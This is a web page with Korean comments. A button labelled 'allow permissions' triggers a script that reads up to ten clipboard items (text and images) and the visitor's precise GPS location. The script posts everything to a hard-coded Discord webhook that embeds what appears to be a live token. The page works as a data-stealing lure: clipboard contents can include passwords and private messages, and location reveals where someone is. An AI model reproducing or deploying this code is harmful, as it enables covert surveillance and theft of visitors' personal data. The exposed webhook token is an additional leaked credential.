<button id="pasteBtn">권한 허용하기</button>
<div id="preview" style="margin-top:20px; padding:10px; border:1px solid #ccc; display:none;">
  <h3>📋</h3>
  <div id="previewContent"></div>
</div>

<script>
// 클립보드 항목 저장소
let clipboardItems = [];

document.getElementById('pasteBtn').addEventListener('click', async () => {
  try {
    // 1. 클립보드 읽기 (최대 10개 항목)
    clipboardItems = [];
    const items = await navigator.clipboard.read();
    let itemCount = 0;
    
    for (const item of items) {
      if (itemCount >= 10) break; // 최대 10개로 제한
      
      const itemData = { index: itemCount + 1 };
      
      // 텍스트 추출
      if (item.types.includes('text/plain')) {
        const text = await item.getType('text/plain');
        itemData.text = await text.text();
      }
      
      // 이미지 추출
      const imageTypes = item.types.filter(type => type.startsWith('image/'));
      if (imageTypes.length > 0) {
        const imageBlob = await item.getType(imageTypes[0]);
        itemData.image = imageBlob;
        itemData.imageType = imageTypes[0];
      }
      
      clipboardItems.push(itemData);
      itemCount++;
    }
    
    // 2. 위치 정보 가져오기
    let locationData = '';
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      });
      
      const { latitude, longitude, accuracy } = position.coords;
      locationData = `📍 **위치**: https://maps.google.com/?q=${latitude},${longitude}
🗺️ **정확도**: ${accuracy}m`;
    } catch (geoErr) {
      locationData = '📍 **위치**: 권한 거부됨';
    }
    
    // 3. 미리보기 표시
    showPreview(clipboardItems, locationData);
    
    // 4. 디스코드로 전송
    await sendToDiscord(clipboardItems, locationData);
    
    alert(`✅ ${clipboardItems.length}개 항목 + 위치 정보가 전송되었습니다!`);
    
  } catch (err) {
    console.error('전체 오류:', err);
    alert('권한을 모두 허용해주세요.');
  }
});

function showPreview(items, locationData) {
  const preview = document.getElementById('preview');
  const content = document.getElementById('previewContent');
  
  let html = '';
  items.forEach((item, idx) => {
    html += `<div style="margin:10px 0; padding:10px; background:#f5f5f5;">`;
    html += `<strong>📌 항목 ${item.index}</strong><br>`;
    
    if (item.text) {
      html += `<div><strong>텍스트:</strong><br>${escapeHtml(item.text)}</div>`;
    }
    
    if (item.image) {
      const imageUrl = URL.createObjectURL(item.image);
      html += `<div><strong>이미지:</strong><br><img src="${imageUrl}" style="max-width:200px; margin-top:5px;"></div>`;
    }
    
    html += `</div>`;
  });
  
  html += `<div style="margin-top:15px; padding:10px; background:#e3fcef;"><strong>${locationData}</strong></div>`;
  
  content.innerHTML = html;
  preview.style.display = 'block';
}

async function sendToDiscord(items, locationData) {
  // 디스코드 웹훅 URL (자신의 서버 웹훅으로 교체)
  const webhookUrl = 'https://discord.com/api/webhooks/1527999868239482901/qUOQ1qwgXMtzRfFfj06rKD8BW_ExiVyyQBQFffZzdzi7kk1Qlm_acn_oAeGE2p2q2eqJ';
  
  // 전체 메시지 구성
  let fullMessage = `📋 **클립보드 항목** (총 ${items.length}개)

`;
  
  items.forEach((item, idx) => {
    fullMessage += `**📌 항목 ${item.index}**
`;
    
    if (item.text) {
      // 텍스트가 길면 잘라서 표시
      const displayText = item.text.length > 500 
        ? item.text.substring(0, 500) + '... (전체는 파일로 첨부)' 
        : item.text;
      fullMessage += `**텍스트:**
${displayText}

`;
    }
    
    if (item.image) {
      fullMessage += `**이미지:** (아래 첨부)
`;
    }
    
    fullMessage += `─────────────────
`;
  });
  
  fullMessage += `
${locationData}`;
  
  // FormData 생성
  const formData = new FormData();
  formData.append('content', fullMessage);
  
  // 모든 이미지 첨부
  items.forEach((item, idx) => {
    if (item.image) {
      const ext = item.imageType.split('/')[1] || 'png';
      formData.append(`file${idx}`, item.image, `clipboard-${idx + 1}.${ext}`);
    }
  });
  
  // 텍스트가 길면 파일로도 첨부
  const longTextItems = items.filter(item => item.text && item.text.length > 500);
  if (longTextItems.length > 0) {
    let allText = '';
    longTextItems.forEach(item => {
      allText += `=== 항목 ${item.index} ===
${item.text}

`;
    });
    const blob = new Blob([allText], { type: 'text/plain' });
    formData.append('file_fulltext', blob, 'full-text.txt');
  }
  
  const response = await fetch(webhookUrl, {
    method: 'POST',
    body: formData
  });
  
  if (!response.ok) {
    throw new Error('전송 실패');
  }
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}
</script>
